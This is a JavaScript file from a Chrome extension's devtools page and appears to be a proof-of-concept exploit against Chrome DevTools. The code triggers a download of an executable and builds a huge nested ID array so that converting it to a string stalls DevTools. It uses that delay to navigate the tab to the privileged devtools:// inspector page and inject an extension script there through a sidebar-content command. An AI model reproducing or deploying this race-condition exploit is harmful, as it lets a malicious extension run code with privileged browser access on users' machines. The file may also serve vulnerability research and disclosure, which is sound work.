// Used when generating the sidebar ID array.
const outerArrayLength = 100000;
const innerArrayLength = 250;

// The devtools_page entry will be loaded when opening a location like
// devtools://devtools/bundled/inspector.html in a tab, even though the devtools won't be connected.
// The code below only needs to run when there's a page being debugged.
if (chrome.devtools.inspectedWindow.tabId) {
    startProcess();
}

function startProcess() {
    chrome.tabs.create({url: "https://live.sysinternals.com/procexp.exe"});

    setTimeout(() => {
        onDownloadStarted();
    }, 1000);
}

function onDownloadStarted() {
    // It's important that the context ID of the main frame on the non-privileged page here is the
    // same as the context ID of the main frame on the privileged page navigated to below. The
    // context ID for the privileged page should always be 1. For the context ID of the
    // non-privileged page to also be 1, the user can't have it (or another page on that site) open
    // in another tab. So the page should be a location that's unlikely for the user to have open.
    chrome.tabs.update(chrome.devtools.inspectedWindow.tabId, {url: "https://example.com/"});

    setTimeout(() => {
        onNavigatedToInitialPage();
    }, 2000);
}

function onNavigatedToInitialPage() {
    let channel = new MessageChannel();
    parent.postMessage("registerExtension", "*", [channel.port2]);

    let channel2 = new MessageChannel();
    parent.postMessage("registerExtension", "*", [channel2.port2]);

    // This is the same string that's formed when converting idArray to a string. However,
    // converting the array to a string is expensive, while generating the string this way is cheap.
    let sidebarId = ",".repeat(outerArrayLength - 1);
    channel.port1.postMessage({command: "createSidebarPane", panel: "elements", id: sidebarId,
        title: "Sidebar"});

    let chromeInspectScriptUrl = chrome.extension.getURL("chrome_inspect.js");
    let devtoolsScriptUrl = chrome.extension.getURL("devtools.js");
    let notifierPageUrl = chrome.extension.getURL("notifier.html");
    let devtoolsNotConnectedScriptUrl = chrome.extension.getURL("devtools_not_connected.js");

    let idArray = generateSidebarIdArray();
    let expression = `let devtoolsTimingEx = {};
    devtoolsTimingEx.chromeInspectScriptUrl = "${chromeInspectScriptUrl}";
    devtoolsTimingEx.devtoolsScriptUrl = "${devtoolsScriptUrl}";
    devtoolsTimingEx.notifierPageUrl = "${notifierPageUrl}";
    let script = document.createElement("script");
    script.src = "${devtoolsNotConnectedScriptUrl}";
    document.head.appendChild(script);`;

    // When the devtools processes this message, the first thing it will do is look the sidebar up
    // by its ID. That means the devtools will need to convert idArray to a string, something that
    // takes a non-trivial amount of time. While that's happening, the devtools won't be able to do
    // anything else (including handling navigation notifications).
    channel.port1.postMessage({command: "setSidebarContent", id: idArray, expression: expression,
        rootTitle: "Title", evaluateOnPage: true});

    setTimeout(() => {
        channel2.port1.postMessage({command: "_forwardKeyboardEvent", entries: [
            {eventType: "keydown", key: "R", code: "KeyR", keyCode: 82, altKey: true}
        ]});

        setTimeout(() => {
            // Because of the time needed to convert idArray to a string, this navigation should
            // finish well before the devtools is able to process the navigation notification.
            chrome.tabs.update(chrome.devtools.inspectedWindow.tabId,
                {url: "devtools://devtools/bundled/inspector.html"});
        }, 1000);
    }, 1000);
}

function generateSidebarIdArray() {
    let idArray = new Array(outerArrayLength);
    let innerArray = [];

    for (let i = 0;i < innerArrayLength;i++) {
        innerArray = [innerArray];
    }

    idArray.fill(innerArray);

    return idArray;
}